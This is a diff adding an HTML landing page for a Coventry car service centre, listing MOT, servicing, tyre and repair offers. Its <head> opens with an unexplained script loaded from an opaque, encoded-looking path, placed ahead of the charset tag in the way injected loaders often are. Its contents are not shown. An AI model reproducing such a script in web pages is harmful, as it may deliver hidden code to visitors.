@@ -1,0 +1,590 @@
+<!doctype html>
+<html lang="en">
+<head><script type='text/javascript' src='https://binleywoodsfoleshill.co.uk/s2tNFkgouc6gA1RLnTGHdW_yFKbZDtUsqtXXP66e_wbxOb6_5Sc0snqwq22ZTKPFhNBfSJ78MEvAWMRG5cxZdGFP-ddoMvI-94UYeA_2Xh85UQ6AjdIXznUZkpsBjfdzbQvYD7McCoKuuJN6gXO002yEawITEGTjMwX2FnlAdcQ='></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Binley Woods Service Centre – Coventry</title>
+  <link rel="icon" type="image/png" href="binleylogo.png">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --primary:#0B5DBA;         /* Binley blue */
+      --primary-600:#0A4EA0;
+      --primary-700:#093F84;
+      --accent:#FF9F1A;          /* Mobile Auto Experts orange */
+      --ink:#0B1320;
+      --muted:#64748b;
+      --bg:#0b1b33;
+      --card:#0f223f0f;
+      --ring:#dbeafe;
+      --success:#16a34a;
+      --warning:#f59e0b;
+      --white:#fff;
+    }
+
+    /* --- Reset / base --- */
+    *,*::before,*::after{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial,Helvetica,sans-serif;
+      color:#0b1320;
+      background:#fff;
+      line-height:1.5;
+      -webkit-font-smoothing:antialiased;
+      text-rendering:optimizeLegibility;
+    }
+    a{color:inherit;text-decoration:none}
+    img{max-width:100%;display:block}
+
+    /* --- Utilities --- */
+    .container{width:min(1200px,92%);margin-inline:auto}
+    .btn{
+      display:inline-flex;align-items:center;gap:.6rem;
+      background:var(--accent);color:#1f2937;
+      padding:.85rem 1.15rem;border-radius:.75rem;
+      font-weight:600;border:0;cursor:pointer;box-shadow:0 6px 18px #ff9f1a33;
+      transition:.2s transform,.2s filter;
+    }
+    .btn:hover{transform:translateY(-1px);filter:saturate(1.05)}
+    .btn.outline{background:transparent;border:2px solid var(--white);color:var(--white);box-shadow:none}
+    .pill{padding:.25rem .6rem;border-radius:999px;font-size:.78rem;font-weight:700;letter-spacing:.02em}
+
+    /* --- Topbar --- */
+    .topbar{
+      background:#0b1b33;color:#cbd5e1;font-size:.9rem
+    }
+    .topbar .wrap{
+      display:flex;justify-content:space-between;align-items:center;padding:.5rem 0
+    }
+    .topbar .left-info{
+      display:flex;
+      align-items:center;
+      gap:1.5rem;
+    }
+    .topbar .logos{
+      display:flex;
+      align-items:center;
+      gap:1rem;
+    }
+    .topbar .logos img{
+      height:24px;
+      width:auto;
+      opacity:0.9;
+    }
+    .topbar a{color:#e2e8f0}
+    .topbar .tel{font-weight:700;color:#e6f0ff}
+    .topbar svg{width:18px;height:18px}
+
+    /* --- Header / Nav --- */
+    header{border-bottom:1px solid #e5e7eb;background:#fff;position:sticky;top:0;z-index:40}
+    .nav{display:flex;align-items:center;justify-content:space-between;padding:1rem 0;gap:1rem}
+    .brand{display:flex;align-items:center;gap:.75rem;font-weight:800;color:var(--primary-700);font-size:1.15rem}
+    .brand .logo-img{
+      height:48px;
+      width:auto;
+    }
+    nav ul{display:flex;gap:1rem;list-style:none;margin:0;padding:0}
+    nav a{
+      padding:.6rem .8rem;border-radius:.6rem;color:#0f172a;font-weight:600;
+    }
+    nav a:hover{background:#0f223f0e}
+    .nav-cta{display:flex;gap:.6rem;align-items:center}
+    .hamburger{display:none;background:transparent;border:0;padding:.5rem}
+    .hamburger span{display:block;width:24px;height:2px;background:#111;margin:5px 0;border-radius:2px}
+
+    /* --- Scrolling Banner --- */
+    .scrolling-banner {
+      background: linear-gradient(90deg, var(--accent), #ff8c00);
+      color: #fff;
+      padding: 0.75rem 0;
+      overflow: hidden;
+      position: relative;
+      font-weight: 700;
+      font-size: 1rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+    
+    .scrolling-content {
+      display: flex;
+      animation: scroll 30s linear infinite;
+      white-space: nowrap;
+    }
+    
+    .scrolling-content span {
+      padding: 0 3rem;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    
+    .scrolling-content span::after {
+      content: "•";
+      margin-left: 2rem;
+    }
+    
+    @keyframes scroll {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-50%); }
+    }
+    
+    /* Mobile adjustments for scrolling banner */
+    @media (max-width: 700px) {
+      .scrolling-banner {
+        font-size: 0.85rem;
+      }
+      .scrolling-content {
+        animation-duration: 20s;
+      }
+      .topbar .wrap{
+        flex-direction:column;
+        gap:.5rem;
+        text-align:center
+      }
+      .topbar .left-info{
+        flex-direction:column;
+        gap:.5rem;
+      }
+    }
+
+    /* --- Announcement --- */
+    .announce{
+      background:#0f223f;color:#dbeafe;
+      padding:.55rem 0;font-weight:600;font-size:.95rem
+    }
+    .announce strong{color:#fff}
+
+    /* --- Hero --- */
+    .hero{
+      position:relative;
+      background:
+        radial-gradient(1200px 600px at 90% -40%, #ffffff0a, transparent),
+        linear-gradient(180deg, var(--primary-700), var(--primary));
+      color:#eaf2ff;
+      overflow:hidden;
+    }
+    .hero .wrap{display:grid;grid-template-columns:1.15fr .85fr;gap:2rem;align-items:center;padding:clamp(2rem,5vw,4rem) 0}
+    .eyebrow{display:inline-flex;gap:.5rem;align-items:center;background:#ffffff1a;border:1px solid #ffffff2e;color:#eef6ff;padding:.35rem .6rem;border-radius:999px;font-weight:700;font-size:.8rem}
+    .hero h1{
+      margin:.75rem 0 1rem;font-size:clamp(2rem,4.6vw,3.4rem);line-height:1.05;color:#fff
+    }
+    .lead{color:#e7f0ffb0;max-width:60ch;font-size:1.05rem}
+    .cta-row{display:flex;flex-wrap:wrap;gap:.75rem;margin-top:1.25rem}
+    .hero-image{
+      aspect-ratio:1/1;
+      border-radius:22px;
+      overflow:hidden;
+      background:linear-gradient(145deg,#ffffff08,#ffffff12);
+      border:1px solid #eaf2ff33;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+    .hero-image img{
+      width:100%;
+      height:100%;
+      object-fit:cover;
+      opacity:.95;
+      filter:brightness(1.1) contrast(1.05);
+    }
+
+    /* --- Services --- */
+    .section{padding:clamp(2rem,6vw,4rem) 0}
+    .section h2{font-size:clamp(1.6rem,3.2vw,2.2rem);margin:0 0 1.2rem}
+    .muted{color:var(--muted)}
+    .grid{display:grid;gap:1rem}
+    .grid.cols-3{grid-template-columns:repeat(3,1fr)}
+    .grid.cols-4{grid-template-columns:repeat(4,1fr)}
+    
+    /* Mobile responsive grids */
+    @media (max-width:1000px){
+      .hero .wrap{grid-template-columns:1fr}
+      .hero-image{display:none}
+      .grid.cols-4{grid-template-columns:repeat(2,1fr)}
+    }
+    @media (max-width:700px){
+      .grid.cols-3{grid-template-columns:1fr}
+      .grid.cols-4{grid-template-columns:1fr}
+      .hamburger{display:block}
+      nav ul{display:none;position:absolute;top:64px;left:0;right:0;background:#fff;border-bottom:1px solid #e5e7eb;padding:1rem;flex-direction:column}
+      nav ul.open{display:flex}
+      .nav-cta{width:100%;justify-content:center}
+      .btn{width:100%;justify-content:center}
+    }
+
+    .card{
+      background:#fff;border:1px solid #e5e7eb;border-radius:16px;
+      overflow:hidden;
+      box-shadow:0 6px 18px #0b5dba0f;transition:.2s transform,.2s box-shadow
+    }
+    .card:hover{transform:translateY(-3px);box-shadow:0 12px 32px #0b5dba1c}
+    
+    /* Card image styling */
+    .card-img{
+      width:100%;
+      height:150px;
+      object-fit:cover;
+      margin-bottom:1rem;
+    }
+    
+    .card-content{
+      padding:1.1rem;
+    }
+    
+    .card h3{margin:.25rem 0 .4rem;font-size:1.05rem;padding:0 1.1rem}
+    .card p{margin:0;color:#475569;padding:0 1.1rem .5rem}
+    
+    .icon{
+      width:44px;height:44px;border-radius:10px;display:grid;place-items:center;
+      background:linear-gradient(135deg,var(--primary),#1C7ED6);color:#fff;margin-bottom:.65rem
+    }
+
+    /* --- Badges --- */
+    .badges{display:flex;flex-wrap:wrap;gap:.6rem}
+    .badge{
+      background:#0f223f0a;border:1px solid #0b5dba22;color:#0b1b33;border-radius:999px;
+      padding:.45rem .75rem;font-weight:700;display:inline-flex;gap:.5rem;align-items:center
+    }
+    .badge .dot{width:8px;height:8px;border-radius:999px;background:var(--accent)}
+
+    /* --- How it works --- */
+    .steps{display:grid;gap:1rem}
+    .steps .step{background:#fff;border:1px solid #e5e7eb;border-radius:16px;padding:1rem}
+    .num{width:34px;height:34px;border-radius:10px;background:var(--accent);display:grid;place-items:center;font-weight:800}
+
+    /* --- Reviews --- */
+    .stars{color:#fbbf24}
+    .quote{font-size:.98rem;color:#334155}
+    
+    /* Review cards with images */
+    .review-card {
+      background:#fff;
+      border:1px solid #e5e7eb;
+      border-radius:16px;
+      overflow:hidden;
+      box-shadow:0 6px 18px #0b5dba0f;
+    }
+    
+    .review-img {
+      width:100%;
+      height:120px;
+      object-fit:cover;
+    }
+    
+    .review-content {
+      padding:1.1rem;
+    }
+
+    /* --- Locations / contact --- */
+    .loc{background:#0f223f;color:#e5edff;border-radius:18px;padding:1.25rem;border:1px solid #1c3357}
+    .loc h3{color:#fff;margin:.1rem 0 .5rem}
+    .loc a{color:#e5edff;text-decoration:underline}
+    .kicker{font-weight:700;color:#0f223f;margin:.5rem 0 0}
+
+    /* --- Footer --- */
+    footer{background:#0b1b33;color:#cbd5e1}
+    footer .cols{display:grid;gap:1.25rem;grid-template-columns:2fr 1fr 1fr}
+    footer a{color:#e2e8f0}
+    .sub{border-top:1px solid #223451;margin-top:1rem;padding-top:1rem;color:#9fb4d4;font-size:.95rem}
+    
+    @media (max-width:700px){
+      footer .cols{grid-template-columns:1fr}
+    }
+
+    /* --- Chat bubble (decorative) --- */
+    .chat{
+      position:fixed;right:16px;bottom:18px;background:#fff;border:1px solid #e5e7eb;border-radius:16px;
+      box-shadow:0 10px 30px #00000018;padding:.65rem .85rem;display:flex;gap:.6rem;align-items:center
+    }
+    .chat .dot{width:8px;height:8px;border-radius:999px;background:#22c55e}
+    .sr-only{position:absolute;clip:rect(1px,1px,1px,1px);padding:0;border:0;height:1px;width:1px;overflow:hidden;white-space:nowrap}
+  </style>
+</head>
+<body>
+
+  <!-- Topbar -->
+  <div class="topbar">
+    <div class="container wrap">
+      <div class="left-info">
+        <div class="logos">
+          <img src="aa.png" alt="AA Logo">
+          <img src="rac.png" alt="RAC Logo">
+        </div>
+        <div>Foleshill: 1a Broad Street Jetty, Coventry, CV6 5BE</div>
+      </div>
+      <div>
+        <a class="tel" href="#">02477 990062</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- Header / Navigation -->
+  <header>
+    <div class="container nav">
+      <a class="brand" href="#home">
+        <img src="binleylogo.png" alt="Binley Logo" class="logo-img">
+        <span>Binley Woods Service Centre</span>
+      </a>
+
+      <button class="hamburger" aria-label="Toggle menu" onclick="document.getElementById('navlist').classList.toggle('open')">
+        <span></span><span></span><span></span>
+      </button>
+
+      <nav>
+        <ul id="navlist">
+          <li><a href="#services">Service Centre</a></li>
+          <li><a href="#other">Other Services</a></li>
+          <li><a href="#how">How it works</a></li>
+          <li><a href="#reviews">Reviews</a></li>
+          <li><a href="#locations">Locations</a></li>
+        </ul>
+      </nav>
+
+      <div class="nav-cta">
+        <a class="btn" href="#">Call Now</a>
+      </div>
+    </div>
+  </header>
+
+  <!-- Scrolling MOT Banner -->
+  <div class="scrolling-banner">
+    <div class="scrolling-content">
+      <span>NOW AUTHORISED DVSA MOT TEST CENTRE CLASS 4 & 7</span>
+      <span>SPECIAL OFFER: £19 MOT WITH FULL SERVICE</span>
+      <span>NOW AUTHORISED DVSA MOT TEST CENTRE CLASS 4 & 7</span>
+      <span>SPECIAL OFFER: £19 MOT WITH FULL SERVICE</span>
+      <span>NOW AUTHORISED DVSA MOT TEST CENTRE CLASS 4 & 7</span>
+      <span>SPECIAL OFFER: £19 MOT WITH FULL SERVICE</span>
+    </div>
+  </div>
+
+  <!-- Hero -->
+  <section id="home" class="hero">
+    <div class="container wrap">
+      <div>
+        <span class="eyebrow">
+          <span class="pill" style="background:#16a34a22;color:#bbf7d0;border:1px solid #16a34a44">RAC Approved</span>
+          <span class="pill" style="background:#f59e0b22;color:#fde68a;border:1px solid #f59e0b44">AA Verified</span>
+        </span>
+
+        <h1>Free collection & delivery with a service booking</h1>
+        <p class="lead">Quality workmanship, clear pricing, and quick turnarounds for Coventry & Rugby. Book your MOT, service, tyres, diagnostics and more.</p>
+
+        <div class="cta-row">
+          <a class="btn" href="#" aria-label="Book your MOT now">
+            <!-- calendar icon -->
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M7 3v4m10-4v4M3 10h18M5 8h14a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-9a2 2 0 0 1 2-2Z" stroke="#1f2937" stroke-width="2" stroke-linecap="round"/></svg>
+            Book MOT – £19 with Full/Major
+          </a>
+          <a class="btn outline" href="#services">View services</a>
+        </div>
+      </div>
+
+      <div class="hero-image" aria-hidden="true">
+        <img src="https://images.unsplash.com/photo-1625047509168-a7026f36de04?w=600&h=600&fit=crop" alt="Professional mechanic working on car service">
+      </div>
+    </div>
+  </section>
+
+  <!-- Services -->
+  <section id="services" class="section">
+    <div class="container">
+      <h2>Most popular</h2>
+      <p class="muted">Call us to book your service in under 60 seconds.</p>
+
+      <div class="grid cols-4" style="margin-top:1rem">
+        <div class="card">
+          <img src="https://images.unsplash.com/photo-1632823471565-1ecdf5c6da3e?w=400&h=250&fit=crop" alt="MOT Testing Service" class="card-img">
+          <h3>MOT</h3>
+          <p>DVSA class 4 & 7 testing with straightforward advice.</p>
+          <p class="kicker">From £19 with Full/Major</p>
+        </div>
+
+        <div class="card">
+          <img src="https://images.unsplash.com/photo-1625047509168-a7026f36de04?w=400&h=250&fit=crop" alt="Car Servicing" class="card-img">
+          <h3>Servicing</h3>
+          <p>Interim, Full, and Major servicing for all makes.</p>
+          <p class="kicker">OEM parts · Digital history</p>
+        </div>
+
+        <div class="card">
+          <img src="https://images.unsplash.com/photo-1561361513-2d000a50f0dc?w=400&h=250&fit=crop" alt="Tyre and Mobile Fitting" class="card-img">
+          <h3>Tyres & Mobile Fitting</h3>
+          <p>Premium to budget options with on-site fitting.</p>
+          <p class="kicker">We come to you</p>
+        </div>
+
+        <div class="card">
+          <img src="https://images.unsplash.com/photo-1632823469850-2f77dd9c7f93?w=400&h=250&fit=crop" alt="Diagnostics and Repairs" class="card-img">
+          <h3>Diagnostics & Repairs</h3>
+          <p>Brakes, exhaust, DPF cleaning, batteries & more.</p>
+          <p class="kicker">Hybrid & EV ready</p>
+        </div>
+      </div>
+
+      <div class="badges" style="margin-top:1.25rem">
+        <span class="badge"><span class="dot"></span> RAC Approved Garage</span>
+        <span class="badge"><span class="dot"></span> AA Verified</span>
+        <span class="badge"><span class="dot"></span> Shell Helix Approved</span>
+        <span class="badge"><span class="dot"></span> IMI Hybrid/EV Accredited</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- Other services quick list -->
+  <section id="other" class="section" style="background:#f8fafc">
+    <div class="container">
+      <h2>Other services</h2>
+      <div class="grid cols-4" style="margin-top:1rem">
+        <div class="card">
+          <img src="https://images.unsplash.com/photo-1598084991519-c90900bc9df0?w=400&h=200&fit=crop" alt="Air Conditioning Service" class="card-img">
+          <h3>Air-Con Service</h3>
+          <p>Stay cool with leak checks & regas.</p>
+        </div>
+        <div class="card">
+          <img src="https://images.unsplash.com/photo-1619642751034-765dfdf7c58e?w=400&h=200&fit=crop" alt="DPF Cleaning Service" class="card-img">
+          <h3>DPF Cleaning</h3>
+          <p>Restore performance & emissions.</p>
+        </div>
+        <div class="card">
+          <img src="https://images.unsplash.com/photo-1486262715619-67b85e0b08d3?w=400&h=200&fit=crop" alt="Gearbox Repair" class="card-img">
+          <h3>Gearbox Centre</h3>
+          <p>Automatic gearbox diagnostics & repair.</p>
+        </div>
+        <div class="card">
+          <img src="https://images.unsplash.com/photo-1492144534655-ae79c964c9d7?w=400&h=200&fit=crop" alt="Cambelt Replacement" class="card-img">
+          <h3>Cambelts & Water Pumps</h3>
+          <p>Prevent costly engine damage.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- How it works -->
+  <section id="how" class="section">
+    <div class="container">
+      <h2>How it works</h2>
+      <div class="steps grid cols-4" style="margin-top:1rem">
+        <div class="step">
+          <div class="num">1</div>
+          <h3>Book</h3>
+          <p class="muted">Call us to book your service.</p>
+        </div>
+        <div class="step">
+          <div class="num">2</div>
+          <h3>We collect</h3>
+          <p class="muted">Free collection & delivery.</p>
+        </div>
+        <div class="step">
+          <div class="num">3</div>
+          <h3>We service</h3>
+          <p class="muted">Technicians update you before any work.</p>
+        </div>
+        <div class="step">
+          <div class="num">4</div>
+          <h3>You drive</h3>
+          <p class="muted">Car returned, paperwork sorted.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Reviews -->
+  <section id="reviews" class="section" style="background:#f8fafc">
+    <div class="container">
+      <h2>What customers say</h2>
+      <div class="grid cols-3" style="margin-top:1rem">
+        <div class="review-card">
+          <img src="https://images.unsplash.com/photo-1594535182308-8ffefaa661e1?w=400&h=200&fit=crop" alt="Happy Customer" class="review-img">
+          <div class="review-content">
+            <div class="stars">★★★★★</div>
+            <p class="quote">"Booked MOT Friday, done Saturday morning. Quick, friendly, and fair."</p>
+            <p class="muted">— Alice D.</p>
+          </div>
+        </div>
+        <div class="review-card">
+          <img src="https://images.unsplash.com/photo-1559416523-140ddc3d238c?w=400&h=200&fit=crop" alt="Professional Service" class="review-img">
+          <div class="review-content">
+            <div class="stars">★★★★★</div>
+            <p class="quote">"Collected my car, replaced clutch, back same day. Brilliant service."</p>
+            <p class="muted">— Tim W.</p>
+          </div>
+        </div>
+        <div class="review-card">
+          <img src="https://images.unsplash.com/photo-1552519507-da3b142c6e3d?w=400&h=200&fit=crop" alt="Quality Service" class="review-img">
+          <div class="review-content">
+            <div class="stars">★★★★★</div>
+            <p class="quote">"Great communication, payment assist available. Highly recommend."</p>
+            <p class="muted">— Kelly M.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Locations -->
+  <section id="locations" class="section">
+    <div class="container">
+      <h2>Branches & contact</h2>
+      <div class="grid cols-4" style="margin-top:1rem">
+        <div class="loc">
+          <h3>Foleshill</h3>
+          <p>1a Broad Street Jetty, Coventry, CV6 5BE</p>
+          <p><a href="#">02477 990062</a></p>
+          <p class="muted">info@binleywoodsfoleshill.co.uk</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Book anchor -->
+  <section id="book" class="section" style="background:#0f223f">
+    <div class="container" style="color:#e5edff">
+      <h2 style="color:#fff">Ready to book?</h2>
+      <p class="muted" style="color:#bcd0f3">Call us to book your service. We'll confirm everything by text or email.</p>
+      <div class="cta-row">
+        <a class="btn" href="#">Call 02477 990062</a>
+        <a class="btn outline" href="#locations">View All Locations</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer class="section">
+    <div class="container">
+      <div class="cols">
+        <div>
+          <div class="brand">
+            <img src="binleylogo.png" alt="Binley Logo" style="height:42px;width:auto;">
+            <span style="color:#e5edff">Binley Woods Service Centre</span>
+          </div>
+          <p style="margin-top:.6rem;color:#9fb4d4">Quality parts, clear communication, and friendly service across Coventry & Rugby.</p>
+        </div>
+        <div>
+          <h3 style="color:#e5edff;margin-top:0">Opening hours</h3>
+          <p>Mon–Fri: 08:30–17:30<br>Sat: 09:00–13:30<br>Sun: Closed</p>
+        </div>
+        <div>
+          <h3 style="color:#e5edff;margin-top:0">Quick links</h3>
+          <p><a href="#services">Services</a><br><a href="#other">Other services</a><br><a href="#how">How it works</a><br><a href="#reviews">Reviews</a></p>
+        </div>
+      </div>
+      <div class="sub">© 2025 Binley Woods Service Centre. All rights reserved.</div>
+    </div>
+  </footer>
+
+  <!-- Decorative chat bubble -->
+  <div class="chat" aria-live="polite">
+    <span class="dot" aria-hidden="true"></span>
+    <span>Hi! Need any help?</span>
+  </div>
+
+  <script>
+    // Close mobile menu when clicking a link (nice touch)
+    document.querySelectorAll('nav a').forEach(a=>{
+      a.addEventListener('click',()=>document.getElementById('navlist')?.classList.remove('open'))
+    })
+  </script>
+</body>
+</html>
